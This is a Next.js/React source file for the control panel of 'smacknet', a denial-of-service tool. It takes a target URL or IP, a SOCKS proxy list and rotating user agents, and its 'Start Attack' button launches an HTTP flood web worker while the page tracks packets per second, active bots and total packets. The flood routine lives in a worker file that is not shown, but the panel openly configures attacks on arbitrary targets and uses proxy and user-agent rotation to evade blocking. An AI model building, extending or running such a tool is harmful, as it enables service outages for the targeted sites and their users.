"use client";

import { Settings2, Terminal, Play, Square } from "lucide-react";
import { useEffect, useState } from "react";
import { AttackStats, Proxy } from "@/lib/types";

interface WorkerMessage {
  log?: string;
  totalPackets?: number;
}

interface WorkerConfig {
  target: string;
  proxies: Proxy[];
  userAgents: string[];
  duration: number;
  packetDelay: number;
  packetSize: number;
}

type CustomWorker = {
  terminate: () => void;
  postMessage: (data: WorkerConfig) => void;
  onmessage: ((e: MessageEvent<WorkerMessage>) => void) | null;
};

function ConfigureProxiesAndAgentsView({ onClose }: { onClose: () => void }) {
  const [loadingConfiguration, setLoadingConfiguration] = useState(false);
  const [configuration, setConfiguration] = useState<string[]>(["", ""]);

  async function retrieveConfiguration(): Promise<string[]> {
    try {
      const response = await fetch(`/api/configuration`);
      const information = (await response.json()) as {
        proxies: string;
        uas: string;
      };

      const proxies = atob(information.proxies);
      const uas = atob(information.uas);

      return [proxies, uas];
    } catch (error) {
      console.error("Failed to load configuration:", error);
      return ["", ""];
    }
  }

  useEffect(() => {
    if (!loadingConfiguration) {
      setLoadingConfiguration(true);
      retrieveConfiguration().then((config) => {
        setLoadingConfiguration(false);
        setConfiguration(config);
      });
    }
  }, [loadingConfiguration]);

  function saveConfiguration() {
    const obj = {
      proxies: btoa(configuration[0]),
      uas: btoa(configuration[1]),
    };

    fetch(`/api/configuration`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(obj),
    }).then(() => {
      onClose();
    });
  }

  return (
    <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50">
      <div className="bg-zinc-900 rounded-lg p-8 max-w-4xl w-full mx-4 max-h-[80vh] overflow-y-auto border border-zinc-800">
        {loadingConfiguration ? (
          <div className="flex flex-col items-center justify-center space-y-2">
            <div className="w-8 h-8 border-2 border-zinc-800 border-t-zinc-400 rounded-full animate-spin"></div>
            <p className="text-zinc-400">Loading configuration...</p>
          </div>
        ) : (
          <div className="space-y-6">
            <div className="flex justify-between items-center">
              <h2 className="text-xl font-medium text-zinc-200">
                Configuration
              </h2>
              <button
                onClick={onClose}
                className="text-zinc-500 hover:text-zinc-300 transition-colors"
              >
                <Settings2 className="w-5 h-5" />
              </button>
            </div>

            <div>
              <label className="block mb-2 text-sm font-medium text-zinc-400">
                Proxy List
              </label>
              <textarea
                value={configuration[0]}
                className="w-full h-40 p-3 bg-zinc-800/50 border border-zinc-700 rounded-md text-zinc-300 placeholder-zinc-600 focus:outline-none focus:border-zinc-600 focus:ring-1 focus:ring-zinc-600 resize-none font-mono text-sm"
                onChange={(e) =>
                  setConfiguration([e.target.value, configuration[1]])
                }
                placeholder="socks4://0.0.0.0:1080&#10;socks4://user:pass@0.0.0.0:12345"
              />
            </div>

            <div>
              <label className="block mb-2 text-sm font-medium text-zinc-400">
                User Agents
              </label>
              <textarea
                value={configuration[1]}
                className="w-full h-40 p-3 bg-zinc-800/50 border border-zinc-700 rounded-md text-zinc-300 placeholder-zinc-600 focus:outline-none focus:border-zinc-600 focus:ring-1 focus:ring-zinc-600 resize-none font-mono text-sm"
                onChange={(e) =>
                  setConfiguration([configuration[0], e.target.value])
                }
                placeholder="Mozilla/5.0 (Windows NT 10.0; Win64; x64)..."
              />
            </div>

            <button
              onClick={saveConfiguration}
              className="w-full p-3 bg-zinc-800 text-zinc-200 rounded-md hover:bg-zinc-700 transition-colors font-medium"
            >
              Save Configuration
            </button>
          </div>
        )}
      </div>
    </div>
  );
}

export default function Home() {
  const [isAttacking, setIsAttacking] = useState(false);
  const [logs, setLogs] = useState<string[]>([]);
  const [progress, setProgress] = useState(0);
  const [target, setTarget] = useState("");
  const [packetSize, setPacketSize] = useState(64);
  const [duration, setDuration] = useState(60);
  const [packetDelay, setPacketDelay] = useState(100);
  const [stats, setStats] = useState<AttackStats>({
    pps: 0,
    bots: 0,
    totalPackets: 0,
  });
  const [openedConfig, setOpenedConfig] = useState(false);
  const [worker, setWorker] = useState<CustomWorker | null>(null);

  const addLog = (message: string) => {
    setLogs((prev) => [message, ...prev].slice(0, 12));
  };

  const startAttack = async () => {
    if (!target.trim()) {
      alert("Please enter a target");
      return;
    }

    try {
      setIsAttacking(true);
      setStats({
        pps: 0,
        bots: 5,
        totalPackets: 0,
      });
      addLog(`[*] Starting attack on ${target}`);

      // Load proxies and user agents from API
      const response = await fetch("/api/files");
      if (!response.ok) {
        throw new Error("Failed to load configuration files");
      }

      const { proxies, userAgents } = await response.json();

      if (!proxies.length || !userAgents.length) {
        throw new Error(
          "No proxies or user agents loaded. Please configure them first."
        );
      }

      // Create and start the worker
      const newWorker = new Worker(
        new URL("../workers/httpFloodWorker.js", import.meta.url)
      );
      const customWorker = newWorker as unknown as CustomWorker;

      // Handle worker messages
      customWorker.onmessage = (e: MessageEvent<WorkerMessage>) => {
        const data = e.data;
        if (data.log) {
          addLog(data.log);
        }
        if (typeof data.totalPackets === "number") {
          const packets = data.totalPackets;
          setStats((prev) => ({
            ...prev,
            totalPackets: packets,
            pps: Math.floor((packets / (Date.now() - startTime)) * 1000),
          }));
        }
      };

      const startTime = Date.now();
      setWorker(customWorker);

      // Send configuration to worker
      customWorker.postMessage({
        target,
        proxies,
        userAgents,
        duration,
        packetDelay,
        packetSize,
      });

      // Update progress
      const progressInterval = setInterval(() => {
        const elapsed = (Date.now() - startTime) / 1000;
        const progressPercent = Math.min((elapsed / duration) * 100, 100);
        setProgress(progressPercent);

        if (elapsed >= duration) {
          clearInterval(progressInterval);
          stopAttack();
        }
      }, 1000);
    } catch (error) {
      const errorMessage =
        error instanceof Error ? error.message : "Unknown error occurred";
      addLog(`[!] Error: ${errorMessage}`);
      setIsAttacking(false);
    }
  };

  const stopAttack = () => {
    if (worker) {
      worker.terminate();
      setWorker(null);
    }
    setIsAttacking(false);
    setProgress(0);
    addLog("[!] Attack stopped");
  };

  // Cleanup on unmount
  useEffect(() => {
    return () => {
      if (worker) {
        worker.terminate();
      }
    };
  }, [worker]);

  return (
    <div className="min-h-screen bg-black text-zinc-100 p-6">
      <div className="max-w-5xl mx-auto space-y-6">
        <div className="flex items-center justify-between">
          <h1 className="text-2xl font-medium">smacknet</h1>
          <button
            onClick={() => setOpenedConfig(true)}
            className="p-2 text-zinc-400 hover:text-zinc-200 transition-colors"
          >
            <Settings2 className="w-5 h-5" />
          </button>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
          <div className="bg-zinc-900 rounded-lg p-4 border border-zinc-800">
            <div className="flex items-center gap-2 mb-3 text-zinc-400">
              <Terminal className="w-4 h-4" />
              <span className="font-medium">Packets/sec</span>
            </div>
            <div className="text-2xl font-medium">
              {stats.pps.toLocaleString()}
            </div>
          </div>

          <div className="bg-zinc-900 rounded-lg p-4 border border-zinc-800">
            <div className="flex items-center gap-2 mb-3 text-zinc-400">
              <Settings2 className="w-4 h-4" />
              <span className="font-medium">Active Bots</span>
            </div>
            <div className="text-2xl font-medium">
              {stats.bots.toLocaleString()}
            </div>
          </div>

          <div className="bg-zinc-900 rounded-lg p-4 border border-zinc-800">
            <div className="flex items-center gap-2 mb-3 text-zinc-400">
              <Terminal className="w-4 h-4" />
              <span className="font-medium">Total Packets</span>
            </div>
            <div className="text-2xl font-medium">
              {stats.totalPackets.toLocaleString()}
            </div>
          </div>
        </div>

        <div className="bg-zinc-900 rounded-lg p-6 border border-zinc-800">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
            <div>
              <label className="block mb-2 text-sm font-medium text-zinc-400">
                Target URL/IP
              </label>
              <input
                type="text"
                value={target}
                onChange={(e) => setTarget(e.target.value)}
                placeholder="Enter target"
                className="w-full px-4 py-2.5 bg-zinc-800/50 border border-zinc-700 rounded-md text-zinc-300 placeholder-zinc-600 focus:outline-none focus:border-zinc-600 focus:ring-1 focus:ring-zinc-600"
                disabled={isAttacking}
              />
            </div>

            <div className="flex items-end">
              <button
                onClick={() => (isAttacking ? stopAttack() : startAttack())}
                className={`
                  w-full px-4 py-2.5 rounded-md font-medium transition-colors flex items-center justify-center gap-2
                  ${
                    isAttacking
                      ? "bg-red-500/10 text-red-500 hover:bg-red-500/20"
                      : "bg-emerald-500/10 text-emerald-500 hover:bg-emerald-500/20"
                  }
                `}
              >
                {isAttacking ? (
                  <>
                    <Square className="w-4 h-4" />
                    Stop Attack
                  </>
                ) : (
                  <>
                    <Play className="w-4 h-4" />
                    Start Attack
                  </>
                )}
              </button>
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
            <div>
              <label className="block mb-2 text-sm font-medium text-zinc-400">
                Packet Size (kb)
              </label>
              <input
                type="number"
                value={packetSize}
                onChange={(e) => setPacketSize(Number(e.target.value))}
                className="w-full px-4 py-2.5 bg-zinc-800/50 border border-zinc-700 rounded-md text-zinc-300 placeholder-zinc-600 focus:outline-none focus:border-zinc-600 focus:ring-1 focus:ring-zinc-600"
                disabled={isAttacking}
                min="1"
                max="1500"
              />
            </div>

            <div>
              <label className="block mb-2 text-sm font-medium text-zinc-400">
                Duration (seconds)
              </label>
              <input
                type="number"
                value={duration}
                onChange={(e) => setDuration(Number(e.target.value))}
                className="w-full px-4 py-2.5 bg-zinc-800/50 border border-zinc-700 rounded-md text-zinc-300 placeholder-zinc-600 focus:outline-none focus:border-zinc-600 focus:ring-1 focus:ring-zinc-600"
                disabled={isAttacking}
                min="1"
                max="300"
              />
            </div>

            <div>
              <label className="block mb-2 text-sm font-medium text-zinc-400">
                Packet Delay (ms)
              </label>
              <input
                type="number"
                value={packetDelay}
                onChange={(e) => setPacketDelay(Number(e.target.value))}
                className="w-full px-4 py-2.5 bg-zinc-800/50 border border-zinc-700 rounded-md text-zinc-300 placeholder-zinc-600 focus:outline-none focus:border-zinc-600 focus:ring-1 focus:ring-zinc-600"
                disabled={isAttacking}
                min="1"
                max="1000"
              />
            </div>
          </div>

          <div className="h-1.5 mb-6 overflow-hidden bg-zinc-800 rounded-full">
            <div
              className="h-full transition-all duration-500 bg-emerald-500/50"
              style={{ width: `${progress}%` }}
            />
          </div>

          <div className="font-mono text-sm bg-zinc-950 rounded-lg border border-zinc-900 divide-y divide-zinc-900">
            {logs.map((log, index) => (
              <div key={index} className="px-4 py-2 text-zinc-400">
                {log}
              </div>
            ))}
            {logs.length === 0 && (
              <div className="px-4 py-2 text-zinc-600">
                [*] Ready for testing...
              </div>
            )}
          </div>
        </div>
      </div>

      {openedConfig && (
        <ConfigureProxiesAndAgentsView onClose={() => setOpenedConfig(false)} />
      )}
    </div>
  );
}
